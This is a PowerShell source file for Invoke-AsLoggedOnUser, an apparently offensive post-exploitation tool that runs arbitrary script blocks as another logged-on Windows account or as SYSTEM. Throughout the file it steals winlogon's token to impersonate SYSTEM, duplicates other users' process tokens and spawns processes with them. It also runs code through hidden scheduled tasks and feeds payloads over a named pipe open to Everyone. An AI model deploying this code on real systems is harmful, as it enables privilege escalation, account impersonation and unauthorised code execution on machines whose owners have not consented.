Function Invoke-AsLoggedOnUser {
<#
.SYNOPSIS
    Invoke PowerShell script block as an account which is logged on the local computer.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    Invoke-AsLoggedOnUser runs PowerShell script block on local computer via scheduled task or token impersonation and retrieves output via a named pipe.

.PARAMETER ScriptBlock
    Specifies the PowerShell script block to run.

.PARAMETER ArgumentList
    Specifies the PowerShell script block arguments.

.PARAMETER Method
    Specifies the execution method to use, defaults to ScheduledTask.

.PARAMETER Identity
    Specifies the account to use, defaults to 'NT AUTHORITY\SYSTEM'.

.EXAMPLE
    PS C:\> Invoke-AsLoggedOnUser -ScriptBlock {whoami} -Identity 'ADATUM\testuser'
#>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $true)]
        [ScriptBlock]
        $ScriptBlock,

        [Object[]]
        $ArgumentList,

        [ValidateSet('ScheduledTask', 'Token')]
        [String]
        $Method = 'ScheduledTask',

        [String]
        $Identity = 'NT AUTHORITY\SYSTEM'
    )

    # Init variables
    $timeout = 10000 # 10s
    $pipename = [guid]::NewGuid().Guid
    $Global:output = $null

    # Build loader
    $loader = ''
    $loader += '$c = New-Object IO.Pipes.NamedPipeClientStream(''.'', ''' + $pipename + ''', [IO.Pipes.PipeDirection]::InOut); '
    $loader += '$c.Connect(' + $timeout + '); '
    $loader += '$r = New-Object IO.StreamReader $c; '
    $loader += '$x = ''''; '
    $loader += 'while (($y=$r.ReadLine()) -ne ''''){$x+=$y+[Environment]::NewLine}; '
    $loader += '$z = [ScriptBlock]::Create($x); '
    $loader += '& $z'
    $arguments = '-NoP -NonI -W 1 -C "' + $loader + '"'

    # Build payload
    $script = ''
    $script += '[ScriptBlock]$scriptBlock = {' + $ScriptBlock.Ast.Extent.Text + '}' + [Environment]::NewLine -replace '{{','{' -replace '}}','}'
    if ($ArgumentList) {
        $args = $ArgumentList -join ','
        $script += '$args = ' + $args + [Environment]::NewLine
    }
    else {
        $script += '$args = $null' + [Environment]::NewLine
    }
    $script += '$output = [Management.Automation.PSSerializer]::Serialize(((New-Module -ScriptBlock $scriptBlock -ArgumentList $args -ReturnResult) *>&1))' + [Environment]::NewLine
    $script += '$encOutput = [char[]]$output' + [Environment]::NewLine
    $script += '$writer = [IO.StreamWriter]::new($c)' + [Environment]::NewLine
    $script += '$writer.AutoFlush = $true' + [Environment]::NewLine
    $script += '$writer.WriteLine($encOutput)' + [Environment]::NewLine
    $script += '$writer.Dispose()' + [Environment]::NewLine
    $script += '$r.Dispose()' + [Environment]::NewLine
    $script += '$c.Dispose()' + [Environment]::NewLine
    $script = $script -creplace '(?m)^\s*\r?\n',''
    $payload = [char[]] $script

    # Create named pipe server
    try {
        $everyoneSid = New-Object Security.Principal.SecurityIdentifier([Security.Principal.WellKnownSidType]::WorldSid, $null)
        $accessRule = New-Object IO.Pipes.PipeAccessRule($everyoneSid, "FullControl", "Allow")
        $pipeSecurity = New-Object IO.Pipes.PipeSecurity
        $pipeSecurity.AddAccessRule($accessRule)
        $pipeServer = New-Object IO.Pipes.NamedPipeServerStream($pipename, [IO.Pipes.PipeDirection]::InOut, 1, [IO.Pipes.PipeTransmissionMode]::Byte, [IO.Pipes.PipeOptions]::Asynchronous, 32768, 32768, $pipeSecurity)
        $serverCallback = [AsyncCallback] {
            Param ([IAsyncResult] $iar)
            Write-Verbose "Client connected to named pipe server \\.\pipe\$pipename"
            $pipeServer.EndWaitForConnection($iar)
            Write-Verbose "Delivering payload"
            $writer = New-Object IO.StreamWriter($pipeServer)
            $writer.AutoFlush = $true
            $writer.WriteLine($payload)
            Write-Verbose "Getting execution output"
            $reader = New-Object IO.StreamReader($pipeServer)
            $output = ''
            while (($data = $reader.ReadLine()) -ne $null) {
                $output += $data + [Environment]::NewLine
            }
            $Global:output = ([Management.Automation.PSSerializer]::Deserialize($output))
            $reader.Dispose()
        }
        $runspacedDelegate = [RunspacedDelegateFactory]::NewRunspacedDelegate($serverCallback, [Runspace]::DefaultRunspace)
        $job = $pipeServer.BeginWaitForConnection($runspacedDelegate, $null)
    }
    catch {
        if ($pipeServer) {
            $pipeServer.Close()
            $pipeServer.Dispose()
        }
        Write-Error "Pipe named server failed to start. $_" -ErrorAction Stop
    }

    switch ($Method) {
        'ScheduledTask' {
            Invoke-ScheduledTaskCmd -Command 'powershell' -Arguments $arguments -WorkingDirectory '%windir%\System32\WindowsPowerShell\v1.0\' -Identity $Identity
        }
        'Token' {
            Invoke-TokenCmd -Command 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' -Arguments $arguments -Identity $Identity
        }
    }

    $pipeServer.Close()
    $pipeServer.Dispose()
    Write-Output ($Global:output)
}

Function Local:Invoke-ScheduledTaskCmd {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $true)]
        [String]
        $Command,

        [String]
        $Arguments,

        [String]
        $WorkingDirectory,

        [Parameter(Mandatory = $true)]
        [String]
        $Identity
    )

    try {
        $scheduleService = New-Object -ComObject ('Schedule.Service')
        $scheduleService.Connect()
        $scheduleTaskFolder = $scheduleService.GetFolder("\")
        $taskDefinition = $scheduleService.NewTask(0)
        $taskDefinition.Settings.StopIfGoingOnBatteries = $false
        $taskDefinition.Settings.DisallowStartIfOnBatteries = $false
        $taskDefinition.Principal.UserID = $Identity
        $taskDefinition.Principal.LogonType = 3
        $taskDefinition.Principal.RunLevel = 1
        $taskName = [guid]::NewGuid().Guid
        $taskAction = $taskDefinition.Actions.Create(0)
        $taskAction.WorkingDirectory = $WorkingDirectory
        $taskAction.Path = $Command
        $taskAction.Arguments = $Arguments
        $taskAction.HideAppWindow = $True

        Write-Verbose "Registering scheduled task $taskName"
        $registeredTask = $scheduleTaskFolder.RegisterTaskDefinition($taskName, $taskDefinition, 6, $Identity, $null, 3)
        Write-Verbose "Running scheduled task as $Identity"
        $scheduledTask = $registeredTask.Run($null)
        do {
            $scheduledTaskInfo = $scheduleTaskFolder.GetTasks(1) | Where-Object Name -eq $scheduledTask.Name; Start-Sleep -Milliseconds 100
        }
        while ($scheduledTaskInfo.State -eq 3 -and $scheduledTaskInfo.LastTaskResult -eq 267045)
        do {
            $scheduledTaskInfo = $scheduleTaskFolder.GetTasks(1) | Where-Object Name -eq $scheduledTask.Name; Start-Sleep -Milliseconds 100
        }
        while ($scheduledTaskInfo.State -eq 4)
        if ($scheduledTaskInfo.LastRunTime.Year -ne (Get-Date).Year) { 
            Write-Warning "Failed to execute scheduled task."
        }
    }
    catch { 
        Write-Error "Task execution failed. $_"
    }
    finally {
        Write-Verbose "Unregistering scheduled task $($taskParameters.TaskName)"
        if ($scheduledTask) { 
            $scheduleTaskFolder.DeleteTask($scheduledTask.Name, 0) | Out-Null
        }
    }
}

Function Local:Invoke-TokenCmd {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $true)]
        [String]
        $Command,

        [String]
        $Arguments,

        [Parameter(Mandatory = $true)]
        [String]
        $Identity
    )

    Begin {
       Function Local:Get-DelegateType {
            Param (
                [OutputType([Type])]

                [Parameter( Position = 0)]
                [Type[]]
                $Parameters = (New-Object Type[](0)),

                [Parameter( Position = 1 )]
                [Type]
                $ReturnType = [Void]
            )
            $Domain = [AppDomain]::CurrentDomain
            $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
            $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
            $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
            $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [MulticastDelegate])
            $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [Reflection.CallingConventions]::Standard, $Parameters)
            $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
            $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
            $MethodBuilder.SetImplementationFlags('Runtime, Managed')
            Write-Output $TypeBuilder.CreateType()
        }

        Function Local:Get-ProcAddress {
            Param (
                [OutputType([IntPtr])]

                [Parameter( Position = 0, Mandatory = $True )]
                [String]
                $Module,

                [Parameter( Position = 1, Mandatory = $True )]
                [String]
                $Procedure
            )
            $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
            $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
            $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
            $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
            $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
            $tmpPtr = New-Object IntPtr
            $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
            Write-Output $GetProcAddress.Invoke($null, @([Runtime.InteropServices.HandleRef] $HandleRef, $Procedure))
        }

        # Win32Structures
        $Domain = [AppDomain]::CurrentDomain
        $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
        $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]

        # Struct STARTUPINFO
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('STARTUPINFO', $Attributes, [ValueType])
        $TypeBuilder.DefineField('cb', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('lpReserved', [IntPtr], 'Public') | Out-Null
        $TypeBuilder.DefineField('lpDesktop', [IntPtr], 'Public') | Out-Null
        $TypeBuilder.DefineField('lpTitle', [IntPtr], 'Public') | Out-Null
        $TypeBuilder.DefineField('dwX', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('dwY', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('dwXSize', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('dwYSize', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('dwXCountChars', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('dwYCountChars', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('dwFillAttribute', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('dwFlags', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('wShowWindow', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('cbReserved2', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('lpReserved2', [IntPtr], 'Public') | Out-Null
        $TypeBuilder.DefineField('hStdInput', [IntPtr], 'Public') | Out-Null
        $TypeBuilder.DefineField('hStdOutput', [IntPtr], 'Public') | Out-Null
        $TypeBuilder.DefineField('hStdError', [IntPtr], 'Public') | Out-Null
        $STARTUPINFO = $TypeBuilder.CreateType()

        # Struct PROCESS_INFORMATION
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('PROCESS_INFORMATION', $Attributes, [ValueType])
        $TypeBuilder.DefineField('hProcess', [IntPtr], 'Public') | Out-Null
        $TypeBuilder.DefineField('hThread', [IntPtr], 'Public') | Out-Null
        $TypeBuilder.DefineField('dwProcessId', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('dwThreadId', [UInt32], 'Public') | Out-Null
        $PROCESS_INFORMATION = $TypeBuilder.CreateType()

        # Struct LUID
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [ValueType], 8)
        $TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('HighPart', [Int32], 'Public') | Out-Null
        $LUID = $TypeBuilder.CreateType()

        # Struct LUID_AND_ATTRIBUTES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [ValueType], 12)
        $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
        $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
        $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()

        # Struct TOKEN_PRIVILEGES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [ValueType], 16)
        $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
        $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()

        # Win32Functions
        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)

        $OpenProcessTokenAddr = Get-ProcAddress advapi32.dll OpenProcessToken
        $OpenProcessTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
        $OpenProcessToken = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessTokenAddr, $OpenProcessTokenDelegate)

        $DuplicateTokenExAddr = Get-ProcAddress advapi32.dll DuplicateTokenEx
        $DuplicateTokenExDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
        $DuplicateTokenEx = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DuplicateTokenExAddr, $DuplicateTokenExDelegate)

        $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
        $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
        $CloseHandle = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)

        $memsetAddr = Get-ProcAddress msvcrt.dll memset
        $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
        $memset = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)

        $ImpersonateLoggedOnUserAddr = Get-ProcAddress advapi32.dll ImpersonateLoggedOnUser
        $ImpersonateLoggedOnUserDelegate = Get-DelegateType @([IntPtr]) ([Bool])
        $ImpersonateLoggedOnUser = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateLoggedOnUserAddr, $ImpersonateLoggedOnUserDelegate)

        $RevertToSelfAddr = Get-ProcAddress advapi32.dll RevertToSelf
        $RevertToSelfDelegate = Get-DelegateType @() ([Bool])
        $RevertToSelf = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RevertToSelfAddr, $RevertToSelfDelegate)

        $CreateProcessAsUserWAddr = Get-ProcAddress advapi32.dll CreateProcessAsUserW
        $CreateProcessAsUserWDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
        $CreateProcessAsUserW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateProcessAsUserWAddr, $CreateProcessAsUserWDelegate)

        $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)

        $OpenThreadTokenAddr = Get-ProcAddress advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)

        $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)

        $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], $LUID.MakeByRefType()) ([Bool])
        $LookupPrivilegeValue = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)

        $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], $TOKEN_PRIVILEGES.MakeByRefType(), [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)

        Function Local:Enable-Privilege {
            Param (
                [ValidateSet("SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege",
                    "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege",
                    "SeDebugPrivilege", "SeEnableDelegationPrivilege", "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege",
                    "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege", "SeMachineAccountPrivilege",
                    "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege",
                    "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege",
                    "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege",
                    "SeUndockPrivilege", "SeUnsolicitedInputPrivilege")]
                [String]
                $Privilege
            )

            [IntPtr]$ThreadHandle = $GetCurrentThread.Invoke()
            if ($ThreadHandle -eq [IntPtr]::Zero) {
                Throw "Unable to get the handle to the current thread"
            }
            [IntPtr]$ThreadToken = [IntPtr]::Zero
            [Bool]$Result = $OpenThreadToken.Invoke($ThreadHandle, $(8 -bor 0x20), $false, [Ref]$ThreadToken)
            $ErrorCode = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($Result -eq $false) {
                if ($ErrorCode -eq 0x3f0) {
                    $Result = $ImpersonateSelf.Invoke(3)
                    if ($Result -eq $false) {
                        Throw (New-Object ComponentModel.Win32Exception)
                    }

                    $Result = $OpenThreadToken.Invoke($ThreadHandle, $(8 -bor 0x20), $false, [Ref]$ThreadToken)
                    if ($Result -eq $false) {
                        Throw (New-Object ComponentModel.Win32Exception)
                    }
                }
                else {
                    Throw ([ComponentModel.Win32Exception] $ErrorCode)
                }
            }
            $CloseHandle.Invoke($ThreadHandle) | Out-Null

            $LuidSize = [Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID)
            $LuidPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($LuidSize)
            $LuidObject = [Runtime.InteropServices.Marshal]::PtrToStructure($LuidPtr, [Type]$LUID)
            [Runtime.InteropServices.Marshal]::FreeHGlobal($LuidPtr)

            $Result = $LookupPrivilegeValue.Invoke($null, $Privilege, [Ref] $LuidObject)
            if ($Result -eq $false) {
                Throw (New-Object ComponentModel.Win32Exception)
            }

            [UInt32]$LuidAndAttributesSize = [Runtime.InteropServices.Marshal]::SizeOf([Type]$LUID_AND_ATTRIBUTES)
            $LuidAndAttributesPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($LuidAndAttributesSize)
            $LuidAndAttributes = [Runtime.InteropServices.Marshal]::PtrToStructure($LuidAndAttributesPtr, [Type]$LUID_AND_ATTRIBUTES)
            [Runtime.InteropServices.Marshal]::FreeHGlobal($LuidAndAttributesPtr)

            $LuidAndAttributes.Luid = $LuidObject
            $LuidAndAttributes.Attributes = 0x2

            [UInt32]$TokenPrivSize = [Runtime.InteropServices.Marshal]::SizeOf([Type]$TOKEN_PRIVILEGES)
            $TokenPrivilegesPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
            $TokenPrivileges = [Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesPtr, [Type]$TOKEN_PRIVILEGES)
            [Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesPtr)
            $TokenPrivileges.PrivilegeCount = 1
            $TokenPrivileges.Privileges = $LuidAndAttributes
            $Global:TokenPriv = $TokenPrivileges

            $Result = $AdjustTokenPrivileges.Invoke($ThreadToken, $false, [Ref] $TokenPrivileges, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
            if ($Result -eq $false) {
                Throw (New-Object ComponentModel.Win32Exception)
            }

            $CloseHandle.Invoke($ThreadToken) | Out-Null
        }

        Function Local:Get-PrimaryToken {
            Param (
                [Parameter(Mandatory = $True)]
                [UInt32]
                $ProcessId,

                [Switch]
                $FullPrivs
            )

            if ($FullPrivs) {
                $tokenPrivs = 0xf01ff
            }
            else {
                $tokenPrivs = 0x0E
            }
            $hToken = [IntPtr]::Zero

            if (($hProcess = $OpenProcess.Invoke(0x400, $False, $ProcessId)) -eq [IntPtr]::Zero) {
                $errorCode = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Throw "Failed to get handle for process $ProcessId. ErrorCode: $errorCode"
            }
            else {
                if (-not $OpenProcessToken.Invoke(([IntPtr][Int] $hProcess), $tokenPrivs, [ref] $hToken)) {
                    $errorCode = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    Throw "Failed to get primary token for process $ProcessId. ErrorCode: $errorCode"
                }
                if (-not $CloseHandle.Invoke($hProcess)) {
                    $errorCode = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    Write-Verbose "Failed to close process handle, this is unexpected. ErrorCode: $errorCode"
                }
            }
            return $hToken
        }

        Function Local:Invoke-ImpersonateUser {
            Param (
                [Parameter(Mandatory=$true)]
                [IntPtr]
                $TokenHandle,

                [String]
                $CreateProcess,

                [String]
                $ProcessArgs
            )

            # Duplicate the process primary token
            $hDulicateToken = [IntPtr]::Zero
            if (-not $DuplicateTokenEx.Invoke($TokenHandle, 0x02000000, [IntPtr]::Zero, 0x02, 0x01, [Ref] $hDulicateToken)) {
                $errorCode = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Error "Failed to duplicate the process token. ErrorCode: $errorCode"
            }
            if ($hDulicateToken -eq [IntPtr]::Zero) {
                Write-Error "Failed to duplicate the process token, this is unexpected."
            }
            if (-not $CloseHandle.Invoke($TokenHandle)) {
                $errorCode = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                Write-Verbose "Failed to close token handle, this is unexpected. ErrorCode: $errorCode"
            }

            if ([String]::IsNullOrEmpty($CreateProcess)) {
                # Impersonate user in the current thread
                if (-not $ImpersonateLoggedOnUser.Invoke($hDulicateToken)) {
                    $Errorcode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    Write-Error "Failed to impersonate user. Error code: $Errorcode"
                }
            }
            else {
                # Impersonate user in a new process
                $startupInfoSize = [Runtime.InteropServices.Marshal]::SizeOf([Type] $STARTUPINFO)
                [IntPtr] $startupInfoPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($startupInfoSize)
                $memset.Invoke($startupInfoPtr, 0, $startupInfoSize) | Out-Null
                [Runtime.InteropServices.Marshal]::WriteInt32($startupInfoPtr, $startupInfoSize)
                $processInfoSize = [Runtime.InteropServices.Marshal]::SizeOf([Type] $PROCESS_INFORMATION)
                [IntPtr] $processInfoPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($processInfoSize)
                $processNamePtr = [Runtime.InteropServices.Marshal]::StringToHGlobalUni("$CreateProcess")
                $processArgsPtr = [IntPtr]::Zero
                if (-not [String]::IsNullOrEmpty($ProcessArgs)) {
                    $processArgsPtr = [Runtime.InteropServices.Marshal]::StringToHGlobalUni("`"$CreateProcess`" $ProcessArgs")
                }
                $success = $CreateProcessAsUserW.Invoke($hDulicateToken, $ProcessNamePtr, $ProcessArgsPtr, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0, [IntPtr]::Zero, [IntPtr]::Zero, $StartupInfoPtr, $ProcessInfoPtr)
                if (-not $success) {
                    $errorCode = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    Write-Error $([ComponentModel.Win32Exception] $errorCode) -ErrorAction Stop
                }
                $processInfo = [Runtime.InteropServices.Marshal]::PtrToStructure($processInfoPtr, [Type] $PROCESS_INFORMATION)
                $process = [Diagnostics.Process]::GetProcessById($processInfo.dwProcessId)
                $process.WaitForExit()
                # Free the handles returned in the ProcessInfo structure
                $CloseHandle.Invoke($processInfo.hProcess) | Out-Null
                $CloseHandle.Invoke($processInfo.hThread) | Out-Null
                # Free StartupInfo memory and ProcessInfo memory
                [Runtime.InteropServices.Marshal]::FreeHGlobal($startupInfoPtr)
                [Runtime.InteropServices.Marshal]::FreeHGlobal($processInfoPtr)
                [Runtime.InteropServices.Marshal]::ZeroFreeGlobalAllocUnicode($processNamePtr)
                # Close handle for the token duplicated
                if (-not $CloseHandle.Invoke($hDulicateToken)) {
                    $errorCode = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    Write-Verbose "Failed to close token handle, this is unexpected. ErrorCode: $errorCode"
                }
            }
        }
    }

    Process {
        # Ensure token duplication works correctly
        if ([Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') {
            Write-Error "This script must be run in STA mode, relaunch powershell.exe with -STA flag" -ErrorAction Stop
        }

        $currentPrincipal = [Security.Principal.WindowsIdentity]::GetCurrent()
        if (-not ($currentPrincipal.isSystem)) {
            # Impersonate NT AUTHORITY\SYSTEM
            $winlogonPid = Get-Process -Name "winlogon" | Select-Object -First 1 -ExpandProperty Id
            try {
                $hToken = Get-PrimaryToken -ProcessId $winlogonPid
                if ($hToken -ne [IntPtr]::Zero) {
                    Write-Verbose "Impersonating process $winlogonPid..."
                    Invoke-ImpersonateUser -TokenHandle $hToken | Out-Null
                }
                else {
                    Write-Error "Failed to get the primary token of process $winlogonPid" -ErrorAction Stop
                }
            }
            catch {
                Write-Error $_ -ErrorAction Stop
            }
        }

        Write-Verbose "Enabling privilege SeAssignPrimaryTokenPrivilege..."
        # Required for calling CreateProcessAsUserW
        Enable-Privilege -Privilege SeAssignPrimaryTokenPrivilege

        # Impersonate user's processes
        $success = $False
        Get-WmiObject -Class Win32_Process | ForEach-Object {
            $process = $_
            if (Get-Process -Id $process.ProcessId -ErrorAction SilentlyContinue) {
                $ownerInfo = $process.GetOwner()
                $ownerString = "$($ownerInfo.Domain)\$($ownerInfo.User)".ToUpper()
                if ($ownerString -eq $Identity.ToUpper()) {
                    try {
                        $hToken = Get-PrimaryToken -ProcessId $process.ProcessId -FullPrivs
                        if ($hToken -ne [IntPtr]::Zero) {
                            Write-Verbose "Attempting to impersonate process $($process.ProcessId)..."
                            Invoke-ImpersonateUser -TokenHandle $hToken -CreateProcess $Command -ProcessArgs $Arguments
                            $success = $True
                            break
                        }
                    }
                    catch {}
                }
            }
        }
        if (-not $success) {
            Write-Error 'Unable to obtain a handle to a user process.'
        }

        Write-Verbose "Reverting the current thread privileges"
        if (-not $RevertToSelf.Invoke()) {
            Write-Warning "RevertToSelf failed."
        }
    }

    End {}
}

Add-Type -TypeDefinition @'
using System;
using System.Collections.Generic;
using System.Linq;
using System.Linq.Expressions;
using System.Management.Automation.Runspaces;
public class RunspacedDelegateFactory {
    public static Delegate NewRunspacedDelegate(Delegate _delegate, Runspace runspace) {
        Action setRunspace = () => Runspace.DefaultRunspace = runspace;
        return ConcatActionToDelegate(setRunspace, _delegate);
    }
    private static Expression ExpressionInvoke(Delegate _delegate, params Expression[] arguments) {
        var invokeMethod = _delegate.GetType().GetMethod("Invoke");
        return Expression.Call(Expression.Constant(_delegate), invokeMethod, arguments);
    }
    public static Delegate ConcatActionToDelegate(Action a, Delegate d) {
        var parameters = d.GetType().GetMethod("Invoke").GetParameters().Select(p => Expression.Parameter(p.ParameterType, p.Name)).ToArray();
        Expression body = Expression.Block(ExpressionInvoke(a), ExpressionInvoke(d, parameters));
        var lambda = Expression.Lambda(d.GetType(), body, parameters);
        var compiled = lambda.Compile();
        return compiled;
    }
}
'@
